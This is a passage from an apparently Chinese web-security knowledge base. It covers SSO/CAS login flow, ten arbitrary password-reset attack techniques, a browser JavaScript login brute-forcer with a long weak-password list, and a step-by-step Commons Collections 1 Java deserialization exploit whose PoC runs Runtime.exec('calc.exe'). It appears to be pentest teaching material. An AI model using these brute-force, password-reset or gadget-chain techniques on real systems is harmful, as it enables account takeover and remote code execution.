是不同应用，它们的session存在自己的应用内，是不共享的 那么这俩问题应该如何解决呢？ 针对第一个问题： SSO登录之后，可以将Cookie的域设置为一级域，即a.com，这样所有的子域系统都可以访问到顶域的Cookie。在我们设置Cookie的时候，只能设置顶域和自己的域，不能设置其他的域。比如：我们不能在自己的系统中给**baidu.com**的域设置Cookie。 针对第二个问题： 当在SSO系统登录了，这时再访问app1，Cookie也带到了app1的服务端（Server），app1的服务端怎么找到这个Cookie对应的Session呢？这里就要把3个系统的Session共享，如下图所示。共享Session的解决方案有很多，例如：Spring-Session。这样第2个问题也解决了 不同域下的单点登录 同域下的单点登录是巧用了Cookie顶域的特性。如果是不同域呢？不同域之间Cookie是不共享的，怎么办？ 这里我们就要说一说CAS流程了，这个流程是单点登录的标准流程。 CAS基本协议过程 名词解释 Ticket Grangting Ticket(TGT) ： TGT是CAS为用户签发的登录票据，拥有了TGT，用户就可以证明自己在CAS成功登录过。TGT封装了Cookie值以及此Cookie值对应的用户信息。用户在CAS认证成功后，CAS生成cookie（叫TGC），写入浏览器，同时生成一个TGT对象，放入自己的缓存，TGT对象的ID就是cookie的值。当HTTP再次请求到来时，如果传过来的有CAS生成的cookie，则CAS以此cookie值为key查询缓存中有无TGT，如果有的话，则说明用户之前登录过，如果没有，则用户需要重新登录。 Ticket-granting cookie(TGC)： 存放用户身份认证凭证的cookie，在浏览器和CAS Server间通讯时使用，并且只能基于安全通道传输（Https），是CAS Server用来明确用户身份的凭证。 Service ticket(ST) ： 服务票据，服务的惟一标识码 , 由 CASServer 发出（ Http 传送），用户访问Service时，service发现用户没有ST，则要求用户去CAS获取ST.用户向CAS发出获取ST的请求，CAS发现用户有TGT，则签发一个ST，返回给用户。用户拿着ST去访问service，service拿ST去CAS验证，验证通过后，允许用户访问资源 CAS Server： CASServer 负责完成对用户的认证工作 , 需要独立部署 , CAS Server 会处理用户名 /密码等凭证 (Credentials) 。 CAS Client： 负责处理对客户端受保护资源的访问请求，需要对请求方进行身份认证时，重定向到 CAS Server 进行认证。（原则上，客户端应用不再接受任何的用户名密码等 Credentials ）。 CAS Client 与受保护的客户端应用部署在一起，以 Filter 方式保护受保护的资源。 CAS 登录流程 步骤一 浏览器向CAS客户端发起登陆请求，CAS客户端生成“登陆URL”,并把浏览器重定向到该URL。 登陆URL:https://${cas-server-host}:${cas-server-port}/cas-server/login?service=${client-service-url} 其中 cas-server-host: cas认证服务器的域名 cas-server-port: cas认证服务器的port client-service-url: 用于登陆成功后，浏览器重定向的URL 步骤二 浏览器向“登陆URL”发起重定向请求，CAS服务端创建会话，把TGT（Ticket Granting Ticket）放入cookie，并返回登陆页面 步骤三 用户输入用户名和密码,然后提交登陆表单. CAS服务端通过登陆验证后，会生成一个ST(service ticket,简称ticket), 然后把浏览器重定向到${client-service-url}?ticket=${service-ticket} 步骤四 浏览器重定向到${client-service-url}?ticket=${service-ticket}发起重定向请求 步骤五 CAS客户端取出ticket，生成“ticket验证URL”,然后向\"ticket验证URL\"发起http GET请求 \"ticket验证URL\": http://${cas-server-host}:${cas-server-port}/cas-server/serviceValidate?ticket=${service-ticket}&service=${client-service-url} 步骤六 如果CAS服务器通过ticket的有效性检查，那么会返回类似如下格式的XML片段 AAAA 其中AAAA是登陆的用户名 否则返回： YYY 其中： XXX的可能取值是INVALID_REQUEST, INVALID_TICKET, INVALID_SERVICE, INTERNAL_ERROR YYY是错误描述信息 至此CAS的登陆流程结束 登陆成功后，CAS客户端应该在会话中保存登陆状态信息。CAS服务器通常在步骤 6会建立ticket和${client-service-url}的映射关系，以便在登出时通知其业务系统清除缓存中的状态信息 简易步骤 用户访问app系统，app系统是需要登录的，但用户现在没有登录。 跳转到CAS server，即SSO登录系统，以后CAS Server我们统一叫做SSO系统。 SSO系统也没有登录，弹出用户登录页。 用户填写用户名、密码，SSO系统进行认证后，将登录状态写入SSO的session，浏览器（Browser）中写入SSO域下的Cookie。 SSO系统登录完成后会生成一个ST（Service Ticket），然后跳转到app系统，同时将ST作为参数传递给app系统。 app系统拿到ST后，从后台向SSO发送请求，验证ST是否有效。 验证通过后，app系统将登录状态写入session并设置app域下的Cookie。 至此，跨域单点登录就完成了。以后我们再访问app系统时，app就是登录的。接下来，我们再看看访问app2系统时的流程 用户访问app2系统，app2系统没有登录，跳转到SSO。 由于SSO已经登录了，不需要重新登录认证。 SSO生成ST，浏览器跳转到app2系统，并将ST作为参数传递给app2。 app2拿到ST，后台访问SSO，验证ST是否有效。 验证成功后，app2将登录状态写入session，并在app2域下写入Cookie。 SSO系统登录后，跳回原业务系统时，带了个参数ST，业务系统为什么还要拿ST再次访问SSO进行验证？登录认证通过后，为什么不能通过回调地址将用户信息返回给原业务系统，原业务系统直接设置登录状态 如果SSO没有登录，而是直接在浏览器中敲入回调的地址，并带上伪造的用户信息，业务系统会认为登录了，这里就存在票据伪造，所以业务系统还需要拿着ST再次访问SSO进行验证。 总结 单点登录（SSO系统）是保障各业务系统的用户资源的安全 。 各个业务系统获得的信息是，这个用户能不能访问我的资源。 单点登录，资源都在各个业务系统这边，不在SSO那一方。 用户在给SSO服务器提供了用户名密码后，作为业务系统并不知道这件事。 SSO随便给业务系统一个ST，那么业务系统是不能确定这个ST是用户伪造的，还是真的有效，所以要拿着这个ST去SSO服务器再问一下，这个用户给我的ST是否有效，是有效的我才能让这个用户访问参考链接 https://developer.aliyun.com/article/636281 https://www.jianshu.com/p/8daeb20abb84 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:41:42 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/11.其他/06.单点登录SSO原理.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/11.其他/07.任意用户密码重置的10种姿势.html":{"url":"知识库/01.WEB安全/11.其他/07.任意用户密码重置的10种姿势.html","title":"07.任意用户密码重置的10种姿势","keywords":"","body":" 任意用户密码重置的10种姿势 验证码不失效 造成原因 测试方法 验证码直接返回 造成原因 测试方法 验证码未绑定用户 造成原因 测试方法 修改接收的手机或邮箱 造成原因 测试方法 本地验证绕过 造成原因 测试方法 跳过验证步骤 造成原因 测试方法 未效验用户字段的值 造成原因 测试方法 修改密码处ID可替换 造成原因 测试方法 Cookie值的替换 造成原因 测试方法 修改信息时替换字段 造成原因 测试方法 视频地址 大佬总结链接 任意用户密码重置的10种姿势 验证码不失效 造成原因 找回密码的时候获取的验证码缺少时间限制，仅判断了验证码的值是否正确，未判断验证码是否过期 测试方法 通过枚举找到真正的验证码完成验证 验证码直接返回 造成原因 直接输入目标手机号，点击获取验证码，并观察返回包即可 测试方法 输入手机号后点击获取验证码，验证码在客户端生成，并直接返回在Response以方便对接下来的验证码进行比对 验证码未绑定用户 造成原因 输入手机号和验证码进行重置密码的时候，仅对验证码是否正确进行了判断，未对该验证码是否与手机号匹配做验证 测试方法 在提交手机号和验证码的时候，替换手机号为他人手机号进行测试，成功通过验证并重置他人密码 修改接收的手机或邮箱 造成原因 用户名、手机号、验证码三者没有统一进行验证，仅判断了三者中的手机号和验证是否匹配和正确，如果正确则判断成功并进入下一流程。 测试方法 输入用户名获取验证码，修改接收验证码的手机号为自己的号码，自己手机成功接收验证码，提交到网站进行验证，验证成功并进入下一流程。 本地验证绕过 造成原因 客户端在本地进行验证码是否正确的判断，而该判断结果也可以在本地修改，最终导致欺骗客户端，误以为我们已经输入了正确的验证码。 测试方法 重置目标用户，输入错误验证码，修改返回包，把错误改为正确，即可绕过验证步骤，最终重置用户密码。 跳过验证步骤 造成原因 对修改密码的步骤，没有做校验，导致可以直接输入最终修改密码的网址，直接跳转到该页面，然后输入新密码达到重置密码的目的。 测试方法 首先使用自己的账号走一次流程，获取每个步骤的页面链接，然后记录页面3对应的输入新密码的链接，重置他人用户时，获取验证码后，直接输入页面3链接到新密码的界面，输入密码重置成功。 未效验用户字段的值 造成原因 在整个重置密码的流程中，只对验证码和手机号做了校验，未对后面设置新密码的用户身份做判断，导致在最后一步通过修改用户身份来重置他人的密码。 测试方法 使用自己的手机号走流程，在走到最后一个设置密码的流程时，修改数据包里的用户信息。 修改密码处ID可替换 造成原因 修改密码的时候，没有对原密码进行判断，且根据id的值来修改用户的密码，类似的SQL语句： update user set password=\"qwer1234\" where id = ‘1’ 修改数据包里的id的值，即可修改他人密码。 测试方法 修改自己用户密码，抓取数据包，替换数据包中用户对应的id值，即可修改他人的密码。 Cookie值的替换 造成原因 重置密码走到最后一步的时候仅判断唯一的用户标识cookie是否存在，并没有判断该cookie有没有通过之前重置密码过程的验证，导致可替换cookie重置他人用户密码。(cookie可指定用户获取。) 测试方法 重置自己用户密码到达最后阶段，抓到数据包，并在第一阶段重新获取目标用户cookie，替换cookie到我们抓取的数据包中，发包测试。 修改信息时替换字段 造成原因 在执行修改信息的sql语句的时候，用户的密码也当作字段执行了，而且是根据隐藏参数loginid来执行的，这样就导致修改隐藏参数loginid的值，就可以修改他人的用户密码。 测试方法 修改个人资料的时候，抓取数据包，然后来修改数据包的参数和对应的值，参数名一般可以在其他地方找到，替换隐藏参数即可修改他人的密码等信息。 视频地址 http://loudong.360.cn/School/content/id/214 大佬总结链接 http://www.sqlsec.com/2017/10/resetpass.html Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:33:33 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/11.其他/07.任意用户密码重置的10种姿势.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/11.其他/08.网页接口加密暴破.html":{"url":"知识库/01.WEB安全/11.其他/08.网页接口加密暴破.html","title":"08.网页接口加密暴破","keywords":"","body":" 前言 解决办法 实现代码 前言 平时测试的时候，可能会遇到一些接口（如登陆接口）中的某些数据是加密的，如下图： 一般的思路：通过逆向分析前端加密算法，拿到密钥，再写脚本模拟加密过程构造想要的数据 [!note] 上面的思路是常规的思路，如果代码存在混淆，则比较费时费力，甚至分析不出来 因为加密都是在前端执行的，那么我们只需要模拟前端的操作即可 此处抛开burp插件不谈 解决办法 通过js模拟操作即可 定位输入框和按钮 设置数据 点击按钮 分析代码，找到我们要输入的框 然后定位到数据，有jquery的话会方便很多，没有就使用原生的js也不影响 document.getElementsByName(\"username\")[0] document.getElementsByName(\"password\")[0] document.getElementsByClassName(\"btn btn-primary btn-block\")[0] 如果不好找，可以直接编辑html，手动添加id属性 然后再通过id进行定位 document.getElementById(\"testusername\") 定位后该插入数据的就插入数据，该点击的就点击，具体看下面的实现代码 实现代码 var usernames = new Array('13299999999','13333333333','18888888888','13000000000'); var passwords = new Array('qwe123','root','toor','admin','admin123','admin666','admin888','123456','12345','1234','123','12','1','administrator','administrators','admin123456','admin12345','admin1234','admin12','admin1','phpcms','jyxy','asd123','xiaoyin','daxiong','ironport','111111','0','11111111','112233','123123','123321','12345678','654321','666666','888888','abcdef','abcabc','abc123','a1b2c3','test','aaa111','123qwe','qwerty','qweasd','password','p@ssword','passwd','iloveyou','5201314','monkey','1234567','letmein','trustno1','dragon','baseball','master','sunshine','ashley','bailey','passw0rd','shadow','superman','qazwsx','michael','football','xiaoming','qq123456','taobao','wang1234','zxc','changeme','654310','user','Password1','Password123','sql','sqlserver','server','webserver123','pos','kingdee','anypass','jie1982','database','sapassword','9876','sa123','p@ssw0rd','sa','1q2w3e','1q2w3e4r','1234qwer','8848','sasa','asas','9','99','999','9999','99999','999999','9999999','99999999','8','88','888','8888','88888','8888888','88888888','7','77','777','7777','77777','777777','7777777','6','66','666','6666','66666','5','55','555','5555','55555','555555','4','44','444','4444','44444','444444','4444444','3','33','333','3333','33333','333333','2','22','222','2222','22222','222222','11','111','1111','11111','manager','!@#$%^&*()','qwerty123456','zxcvbn123456','sa1','as','aa','aaa','abcd1234','aaaaaa','asdfghjkl;\\'','sa123456789','sasasasa','@#$%&*()','gsp','asdf','power','123@#','778899','13579','12344321','147258','!@#$%^','!@#123','!@#$%^&*()','123!@#','!@##@!','1q2w3e4r','1q2w3e4r5t','1qaz2wsx','1qazxsw2','1qaz2wsx3edc','a','admin75','asd','crm','chinanet','erp','hello','hr','iem','king','MEDIA','microsoft','mnbvcxz','mysql','mysteelsoft','plm','q1w2e3r4','qwertyuiop','r4e3w2q1','sa!@#','sa!@#$%^','sa123456','sapass','saas','sasasa','sql2008','sqlpass','sqlpassword','sqladmin','sys','system','sunny','tianya','zxcvbnm','ems','crm2006','crm2007','crm2008','crm2009','crm2010','hrsvr','sa20060876','golf','123456Aa','123456Ab','123456Ac','test123','WebLogic','free','user1','user12','user123','user1234','user12345','user123456','#NAME?','liuwei123','admin2006','neteye','Test123456','admin*123','ucenter','aa123456','h3capadmin','1234567890','boston','guest','phpmyadmin','fuckyou','7007','jyadmin','020php168','seeyon','111111111','nozuonodie','1\\'or\\'1\\'=\\'1','world','helloworld','manageradmin111111','manageradmin','adminmanager111111','adminmanager','123456qq','qazwsxedc','huangxiaoqin','123456a','huawei','ncportal','111000','1314520','\\'or\\'=\\'or\\'','default','enable','discuz','laixianjian','unvs123','wordpress','leolee','localhost','10000','neworiental','youyuan','zuods123','123***','tomcat','dba','zted888888','xunlei','110','120','114','119','apache','xcmcn123456','adminInfo','skyclass','XXOO','xuezhenhe','10086','10010','guanliyuan','yunwei','cctv6','cctv5','cctv4','cctv3','cctv2','cctv1','12306','12306caonima','ete123','server123','null','admin111','caonima','nimabi','mlgb','conadmin','1qaz!QAZ','TRUE','FALSE'); for (i in usernames) { document.getElementById(\"testusername\").value=usernames[i] for (j in passwords) { document.getElementById(\"testpassword\").value=passwords[j] document.getElementsByClassName(\"btn btn-primary btn-block\")[0].click() } } 效果： Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:33:47 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/11.其他/08.网页接口加密暴破.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/19.CommonsCollections/01.CC1/01.CommonsCollections1分析前置知识.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/01.CC1/01.CommonsCollections1分析前置知识.html","title":"01.CommonsCollections1分析前置知识","keywords":"","body":" 简介 commons-collections-3.1 POC分析 调试 Map.Entry TransformedMap ChainedTransformer.class ConstantTransformer.class InvokerTransformer.class 参考链接 简介 Commons Collections的利用链也被称为cc链，在学习反序列化漏洞必不可少的一个部分。Apache Commons Collections是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。 了解反射机制的话，我们会发现若存在一个固有的反射机制时，输入可控，就可能形成任意函数调用的情况，具有极大的危害。但实际上真的有存在这种情况：这就是commons-collections-3.1 jar包，cve编号：cve-2015-4852 在开始之前我们需要理一下反序列化漏洞的攻击流程： 客户端构造payload(有效载荷)，并进行一层层的封装，完成最后的exp（exploit-利用代码） exp发送到服务端，进入一个服务端自主复写（也可能是也有组件复写）的readobject函数，它会反序列化恢复我们构造的exp去形成一个恶意的数据格式exp_1（剥去第一层） 这个恶意数据exp_1在接下来的处理流程(可能是在自主复写的readobject中、也可能是在外面的逻辑中)，会执行一个exp_1这个恶意数据类的一个方法，在方法中会根据exp_1的内容进行函数处理，从而一层层地剥去（或者说变形、解析）我们exp_1变成exp_2、exp_3...... 最后在一个可执行任意命令的函数中执行最后的payload，完成远程代码执行。 那么以上大概可以分成三个主要部分： payload：需要让服务端执行的语句：比如说弹计算器还是执行远程访问等；我把它称为：payload 反序列化利用链：服务端中存在的反序列化利用链，会一层层拨开我们的exp，最后执行payload。(在此篇中就是commons-collections利用链) readObject复写利用点：服务端中存在的可以与我们漏洞链相接的并且可以从外部访问的readObject函数复写点；我把它称为readObject复写利用点（自创名称...）commons-collections-3.1 首先来看看commons-collections项目吧 官网第一段： Java commons-collections是JDK 1.2中的一个主要新增部分。它添加了许多强大的数据结构，可以加速大多数重要Java应用程序的开发。从那时起，它已经成为Java中公认的集合处理标准。 Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。 它是一个基础数据结构包，同时封装了很多功能，其中我们需要关注一个功能： Transforming decorators that alter each object as it is added to the collection 转化装饰器：修改每一个添加到collection中的object Commons Collections实现了一个TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。 org.apache.commons.collections.Transformer这个类可以满足固定的类型转化需求，其转化函数可以自定义实现，我们的漏洞触发函数就是在于这个点。 漏洞复现需要下载3.1版本源码3.1版本的下载地址,进去寻觅一下源码和jar包都有。 由于没有找到漏洞版本3.1的api说明，我们可以参考3.2.2的api文档 首先创建一个项目，将已下载的Commons-Collections-3.1.jar 导入到项目中，如下所示 POC分析 这里是啦啦0咯咯 大哥提供的poc，在导入了Commons-Collections-3.1.jar的包之后，就能执行成功了 import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class test { public static void main(String[] args) throws Exception { //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码 Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}) }; //将transformers数组存入ChaniedTransformer这个继承类 Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChina Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); //给予map数据转化链 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //触发漏洞 Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式 onlyElement.setValue(\"foobar\"); } } 执行效果如下 Runtime.getRuntime().exec(\"calc.exe\"); 以上代码包含了三要素中的前两项： payload 反序列化链 为什么没有readObject复写利用点？ 这个poc的复写利用点是sun.reflect.annotation.AnnotationInvocationHandler的readObject() 但是我们先精简payload和利用链，最后再加上readObject复写点 调试 调试以上poc，得到两种调用栈 Map.Entry Map.Entry 其实就是键值对的数据格式，其中setValue函数如下 // AbstractInputCheckedMapDecorator.class public Object setValue(Object value) { value = this.parent.checkSetValue(value); return super.entry.setValue(value); } TransformedMap TransformedMap是一种重写map类型的set函数和Map.Entry类型的setValue函数去调用转换链的Map类型。 // TransformedMap.class protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) { super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer; } 首先看他的构造函数，所对应实例化outerMap，Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); 其中对应的如下函数对应的this.valueTransformer 就是传入的transformerChain，而transformerChain 就是定义的transformers数组 // TransformedMap.class protected Object checkSetValue(Object value) { return this.valueTransformer.transform(value); } ChainedTransformer.class 由于TransformedMap具有commons_collections的转变特性，当赋值一个键值对的时候会自动对输入值进行预设的Transformer的调用。 // ChainedTransformer.class public Object transform(Object object) { for(int i = 0; i transform()函数是一个接口函数，在上面的循环中进入了不同的函数 ConstantTransformer.class // ConstantTransformer.class public Object transform(Object input) { return this.iConstant; } InvokerTransformer.class 再是进入了InvokerTransformer.class，看到这个就会发现有点东西了 // InvokerTransformer.class public Object transform(Object input) { if (input == null) { return null; } else { try { Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); } catch (NoSuchMethodException var5) { throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' does not exist\"); } catch (IllegalAccessException var6) { throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\"); } catch (InvocationTargetException var7) { throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", var7); } } } 很明显的反射机制，可见InvokerTransformer就是我们的触发任意代码执行处，我们看看源码中的文件描述 先看看我们需要关注的InvokerTransformer类的描述（在jar包中是找不到描述信息的，可以通过下载官方源码得到）： 我们可以这里有经典的反射机制调用，在细节分析前我们先整理一下调用栈，但不需要很理解。 Map.Entry 类型setValue(\"foobar\") => AbstracInputCheckedMapDecorator.setValue() => TransformedMap.checkSetValue() => ChainedTransformer.transform(Object object) 根据数组，先进入 => ConstantTransformer.transform(Object input) 再进入 => InvokerTransformer.transform(Object input) 参考链接 https://xz.aliyun.com/t/7031#toc-8 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-22 20:58:25 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/19.CommonsCollections/01.CC1/01.CommonsCollections1分析前置知识.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/19.CommonsCollections/01.CC1/02.CommonsCollections1分析利用.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/01.CC1/02.CommonsCollections1分析利用.html","title":"02.CommonsCollections1分析利用","keywords":"","body":" 重构POC InvokerTransformer ChainedTransformer ConstantTransformer 在服务端生成Runtime实例 继续反思反射机制 TransformedMap 封装成Map jdk1.7 AnnotationInvocationHandler的readObject复写点 问题 参考链接 前一篇讲了Commons Collections1的前置知识，三要素有payload，反序列化利用链，可重写的readObject方法 重构POC 首先明确最终目的是要执行命令，也就是说执行Runtime.getRuntime.exec(\"\") Runtime.getRuntime：获取一个Runtime实例 exec：调用实例的exec函数 因为漏洞函数最后是通过反射机制调用任意这个语句先转化成反射机制如下（后面需要用到）： Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")),\"calc.exe\") InvokerTransformer 回看反射机制触发函数InvokerTransformer类的transform(Object input) public Object transform(Object input) { Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); } 通过构造反射机制以及以上代码进行填空，可以得出当变量等于以下值，可以形成命令执行 // Object input input = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")); this.iMethodName = \"exec\"; this.iParamTypes = String.class; this.iArgs = \"calc.exe\"; 那么在InvokerTransformer类源码中我们可以找到赋值 public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; } 我们就可以构建以下测试代码直接调用InvokerTransformer通过反射执行任意命令： 下面开始试一下： package com.myproject; import org.apache.commons.collections.functors.InvokerTransformer; public class test { public static void main(String[] args) throws Exception { InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class},new Object[]{\"calc.exe\"}); Object input = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")); invokerTransformer.transform(input); } } 在这里执行了命令，然后我们再来模拟一下利用情景 为了方便，攻击者受害者写在同一函数 使用文件写入，代替网络传输 由于InvokerTransformer继承了Serializable类，是可以成功序列化的 再来尝试一下，使用IO操作，模拟网络IO操作 package com.myproject; import org.apache.commons.collections.functors.InvokerTransformer; import java.io.*; public class test { public static void main(String[] args) throws Exception { //1.客户端构造序列化payload，使用写入文件模拟发包攻击 InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class},new Object[]{\"calc.exe\"}); FileOutputStream fileOutputStream = new FileOutputStream(\"payload.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(invokerTransformer); //2.服务端从文件中读取payload模拟接受包，然后触发漏洞 //服务端反序列化payload读取 FileInputStream fileInputStream = new FileInputStream(\"payload.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); //神奇第一处：服务端需要自主构造恶意input Object input = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")); //神奇第二处：服务端需要将客户端输入反序列化成InvokerTransformer格式，并在服务端自主传入恶意参数input InvokerTransformer invokerTransformer_in = (InvokerTransformer) objectInputStream.readObject(); invokerTransformer_in.transform(input); } } 在此时我们会发现如果我们要利用这个反射机制作为漏洞的话，需要开发人员帮助我们做以下事儿： 写一个payload作为input 接收客户端输入的参数，反序列化成InvokerTransformer类 再刻意调用InvokerTransformer的transform函数 这种是根本行不通的，所以就面临一些问题： payload需要再客户端可以自定义构造，再传入服务端 服务端需要把我们传入的exp反序列化成一个在代码中可能使用到的类 代码在正常操作中会调用这个类中一个可触发漏洞的函数（当然这个函数最后会进入到InvokerTransformer类的transform函数，从而形成命令执行） 如果这个反序列化的类和这个类触发命令执行的方法可以在一个readObject复写函数中恰好触发，那么就对服务端上下文没有要求了！ 假设如预期这样，是对服务端上下文没有要求，因为只要执行readObject就肯定会命令执行，不需要其他上下文，但是对于服务端版本环境是有要求的（JDK1.7） ChainedTransformer 关注 ChainedTransformer 类，首先看以下这个类的描述 /** * Transformer implementation that chains the specified transformers together. * * The input object is passed to the first transformer. The transformed result * is passed to the second transformer and so on. * * @since Commons Collections 3.0 * @version $Revision: 1.7 $ $Date: 2004/05/16 11:36:31 $ * * @author Stephen Colebourne */ public class ChainedTransformer implements Transformer, Serializabl{} 这个类会把我们的Transformer变成一个串，再逐一执行，其中这个操作对应就是Commons Collections1的前置知识中说的ChainedTransformer.transform函数 public Object transform(Object object) { for(int i = 0; i 在这里会遍历iTransformers数组，依次调用这个数组中每一个Transformer的transform，并串行传递执行结果 首先确定iTransformers可控，iTransformers数组是通过ChainedTransformer类的构造函数赋值的 public ChainedTransformer(Transformer[] transformers) { this.iTransformers = transformers; } 那么可以知道的是，可以自定义iTransformers的内容，已有如下条件 // 最终执行目标 Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")),\"calc.exe\"); // InvokeTransformer关键语句 public Object transform(Object input) { Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); } 在看到InvokeTransformer代码的时候，我们需要引出一个注意点： 这里需要注意input.getClass()这个方法使用上的一些区别 当input是一个类的实例对象，获取到的是这个类 当input是一个类时，获取到的是java.lang.Class 验证如下 Object a = Runtime.getRuntime(); Class b = Runtime.class; System.out.println(a.getClass()); System.out.println(b.getClass()); //结果 //class java.lang.Runtime //class java.lang.Class 基于之前写的代码 InvokerTransformer a = new InvokerTransformer( \"exec\", new Class[]{String.class}, new String[]{\"calc.exe\"}); Object input=Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")); 我们可以知道input为Runtime类的对象，所以cls就是Runtime类，所以cls.getMethod可以找到exec方法，直接调用 首先将a封装成ChainedTransformer格式，但是payload还在外面 package com.myproject; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.io.*; import java.util.HashMap; import java.util.Map; public class test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc.exe\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Object input = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")); chainedTransformer.transform(input); } } 这里其实就是对如下的还原 Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")),\"calc.exe\"); 把payload放入Transformer数组中，需要转化成特定的Transformer格式才行 ConstantTransformer 在ConstantTransformer类中它同样继承了Transformer，可以看到它的transform函数是会返回this.iConstant，然而this.iConstant在构造函数中是等于我们传入的值，也就是说构造函数会写入这个变量，它的transform函数又会返回这个变量 public ConstantTransformer(Object constantToReturn) { this.iConstant = constantToReturn; } 所以我们可以把Runtime的实例写入到这个变量中 package com.myproject; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.io.*; import java.util.HashMap; import java.util.Map; public class test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ // new ConstantTransformer(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\"))), new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc.exe\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(null); // 此处输入可以为任意值，因为不会被使用到，因为Runtime实例被我们写入了this.iTransformers数组中 } } 那么模拟以下序列化与反序列化的过程 package com.myproject; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import 